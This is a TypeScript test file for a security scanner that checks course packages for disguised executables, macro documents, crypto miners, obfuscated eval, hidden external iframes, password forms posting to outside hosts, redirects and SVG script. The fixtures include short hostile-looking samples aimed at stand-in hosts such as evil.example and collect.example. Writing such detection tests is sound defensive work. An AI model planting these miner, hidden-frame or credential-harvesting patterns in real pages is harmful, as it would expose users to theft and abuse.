/**
 * The rule-based security scan: file names, first bytes, and script and
 * markup patterns — and that ordinary course content stays clean.
 */

import { describe, expect, it } from 'vitest'
import { scanHead, scanPath, scanText, sha256 } from './securityScan'

const rules = (findings: { rule: string }[]) => findings.map((f) => f.rule)

describe('scanPath', () => {
  it('flags programs, macro documents, and nested archives by name', () => {
    expect(scanPath('setup.exe')[0]).toMatchObject({ severity: 'error', rule: 'executable-file' })
    expect(scanPath('docs/invoice.pdf.exe')[0]?.message).toContain('double extension')
    expect(scanPath('run.ps1')[0]?.rule).toBe('executable-file')
    expect(scanPath('handout.docm')[0]).toMatchObject({ severity: 'warning', rule: 'macro-document' })
    expect(scanPath('extra/source.zip')[0]).toMatchObject({ severity: 'info', rule: 'nested-archive' })
    for (const ok of ['index.html', 'js/app.js', 'img/a.png', 'media/v.mp4', 'handout.pdf', 'handout.docx']) {
      expect(scanPath(ok)).toEqual([])
    }
  })
})

describe('scanHead', () => {
  it('finds executables named as something else', () => {
    expect(scanHead('img/photo.png', new Uint8Array([0x4d, 0x5a, 0x90, 0]))[0]).toMatchObject({
      rule: 'disguised-executable',
      message: expect.stringContaining('Windows'),
    })
    expect(scanHead('lib.js', new Uint8Array([0x7f, 0x45, 0x4c, 0x46]))[0]?.message).toContain('Linux')
    expect(scanHead('a.png', new Uint8Array([0x89, 0x50, 0x4e, 0x47]))).toEqual([])
    expect(scanHead('setup.exe', new Uint8Array([0x4d, 0x5a]))).toEqual([]) // reported by name
  })
})

describe('scanText', () => {
  it('finds miners, obfuscation, ActiveX, service workers, and break-outs, with line numbers', () => {
    const js = [
      'var x = 1',
      'var miner = new CoinHive.Anonymous("key")',
      'eval(atob("YWxlcnQoMSk="))',
      'navigator.serviceWorker.register("/sw.js")',
      'top.location.href = "https://example.com"',
      'new ActiveXObject("WScript.Shell")',
    ].join('\n')
    const findings = scanText('js/app.js', js)
    expect(rules(findings)).toEqual([
      'crypto-miner',
      'windows-scripting',
      'obfuscated-eval',
      'service-worker',
      'frame-breakout',
    ])
    expect(findings.find((f) => f.rule === 'obfuscated-eval')?.line).toBe(3)
  })

  it('finds hidden external frames, password fields, external forms, and redirects in pages', () => {
    const html = `<html><head><meta http-equiv="refresh" content="0; url=https://evil.example/"></head><body>
      <iframe src="https://evil.example/x" width="0" height="0"></iframe>
      <iframe src="https://www.youtube.com/embed/abc" width="560" height="315"></iframe>
      <form action="https://collect.example/post"><input type="password"></form></body></html>`
    expect(rules(scanText('index.html', html))).toEqual([
      'hidden-external-frame',
      'password-field',
      'external-form',
      'external-redirect',
    ])
  })

  it('follows submit-button formaction and an external base URL', () => {
    const button = `<form action="done.html"><button formaction="https://collect.example/">Send</button></form>`
    expect(scanText('a.html', button)[0]).toMatchObject({
      rule: 'external-form',
      message: expect.stringContaining('submit button'),
    })
    const based = `<html><head><base href="https://collect.example/"></head><body>
      <form action="submit"></form><a href="#top">Top</a></body></html>`
    expect(scanText('b.html', based)).toEqual([
      expect.objectContaining({ rule: 'external-form', message: expect.stringContaining("the page's base") }),
    ])
  })

  it('finds script in SVG images only', () => {
    expect(rules(scanText('img/a.svg', '<svg onload="alert(1)"></svg>'))).toEqual(['svg-script'])
    expect(rules(scanText('index.html', '<script>var a = 1</script>'))).toEqual([])
  })

  it('leaves ordinary course content alone', () => {
    const html = `<html><body><h1>Lesson</h1><iframe src="page2.html" width="0"></iframe>
      <form action="submit.html"><input type="text"></form>
      <script>var api = window.parent.API_1484_11; if (top.location === self.location) {}
      document.getElementById("next").onclick = () => location.href = "page2.html"</script></body></html>`
    expect(scanText('index.html', html)).toEqual([])
  })
})

describe('sha256', () => {
  it('hashes bytes as lowercase hex', async () => {
    expect(await sha256(new TextEncoder().encode('abc'))).toBe(
      'ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad',
    )
  })
})
